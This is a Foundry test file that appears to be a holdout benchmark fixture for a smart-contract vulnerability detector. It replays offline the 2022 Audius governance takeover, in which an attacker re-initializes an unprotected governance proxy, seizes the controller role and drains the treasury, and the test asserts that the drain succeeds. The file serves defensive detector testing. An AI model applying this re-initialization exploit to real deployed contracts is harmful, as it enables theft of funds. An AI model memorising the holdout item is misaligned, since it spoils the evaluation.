// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {
    GovTreasuryToken,
    AudiusGovernanceClone
} from "../fixtures/upgrade-governance/b-incident/AudiusGovernanceClone.sol";

/// @title upgrade-governance (b) real-incident HOLDOUT fixture: Audius governance takeover (2022-07-23).
/// @notice Minimized OFFLINE replay of the documented governance-takeover drain (no live RPC): the
///         upgradeable Governance proxy's `initialize` was callable by anyone, so the attacker
///         installed themselves as controller and executed a treasury transfer out. Real on-chain
///         addresses from the public post-mortem are used for fidelity (see PROVENANCE.md). The
///         verdict is derived from the real outcome (the treasury left the module), not hardcoded.
///
///         HOLDOUT: authored after the wal detectors froze at v0.1 and wal was NOT tuned to pass
///         it (label=vuln -> expect VULNERABLE).
contract AudiusGovernanceIncidentTest is Test {
    // Public, documented addresses (Etherscan txs + Audius official post-mortem).
    address constant ATTACKER = 0xa0c7BD318D69424603CBf91e9969870F21B8ab4c;
    address constant LEGIT_CONTROLLER = address(0x60F); // placeholder legit governance controller

    uint256 constant TREASURY = 18_500_000e18; // representative AUDIO treasury (~18.5M AUDIO)

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[upgrade-governance] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_audiusGovernanceIncident_isDrained() public {
        GovTreasuryToken token = new GovTreasuryToken();
        AudiusGovernanceClone gov = new AudiusGovernanceClone(token);
        gov.initialize(LEGIT_CONTROLLER); // legit deployment-time controller
        token.mint(address(gov), TREASURY);

        uint256 balanceBefore = token.balanceOf(address(gov));

        // Attacker re-initializes the live proxy to seize governance, then executes the malicious
        // treasury transfer (rekt-confirmed treasury-transfer tx 0x4227bca8...; see PROVENANCE.md).
        vm.startPrank(ATTACKER);
        gov.initialize(ATTACKER);
        gov.execute(ATTACKER, balanceBefore);
        vm.stopPrank();

        uint256 finalBalance = token.balanceOf(address(gov));
        bool drained = (balanceBefore > 0 && finalBalance == 0);
        _report("audius-governance-victim", drained);

        assertTrue(drained, "incident replay should drain the governance treasury");
        assertEq(gov.controller(), ATTACKER, "attacker should have seized the controller role");
        assertEq(finalBalance, 0, "treasury should be emptied");
        assertEq(token.balanceOf(ATTACKER), TREASURY, "attacker should hold the drained treasury");
    }
}
